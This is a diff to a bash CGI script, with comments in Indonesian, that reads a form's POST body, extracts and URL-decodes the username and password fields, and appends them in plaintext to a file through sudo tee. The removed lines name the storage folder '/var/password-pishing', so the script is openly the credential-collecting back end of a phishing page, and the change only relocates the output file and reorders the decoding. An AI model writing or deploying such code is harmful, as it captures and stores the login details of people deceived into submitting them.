@@ -3,33 +3,26 @@
 echo "Content-Type: text/html"
 echo ""
 
-# Nama folder penyimpanan
-FOLDER_PASS="/var/password-pishing"
-
-# Buat folder jika belum ada
-mkdir -p "$FOLDER_PASS"
-
-# Lokasi file penyimpanan
-FILE_SAVE="$FOLDER_PASS/user-password.txt"
-
-# Ambil seluruh body POST
+# Baca seluruh data POST
 DATA=$(cat)
 
-# ---- Ambil username ----
+# Ambil username
 USERNAME=$(echo "$DATA" | sed -n 's/.*username=\([^&]*\).*/\1/p')
-USERNAME=${USERNAME//+/ }
+# Decode karakter URL
 USERNAME=$(printf '%b' "${USERNAME//%/\\x}")
+# Ganti + menjadi spasi
+USERNAME=${USERNAME//+/ }
 
-# ---- Ambil password ----
+# Ambil password
 PASSWORD=$(echo "$DATA" | sed -n 's/.*password=\([^&]*\).*/\1/p')
-PASSWORD=${PASSWORD//+/ }
 PASSWORD=$(printf '%b' "${PASSWORD//%/\\x}")
+PASSWORD=${PASSWORD//+/ }
 
-# ---- Format penyimpanan ----
+# Gabungkan
 GABUNG="USER=$USERNAME PASS=$PASSWORD"
 
-# Simpan ke file dengan aman (tanpa masalah sudo)
-echo "$GABUNG" | sudo tee -a "$FILE_SAVE" > /dev/null
+# Simpan ke file dengan benar (tanpa error sudo)
+echo "$GABUNG" | sudo tee -a user-password.txt > /dev/null
 
 # Delay sebelum menampilkan halaman
 sleep 2.5
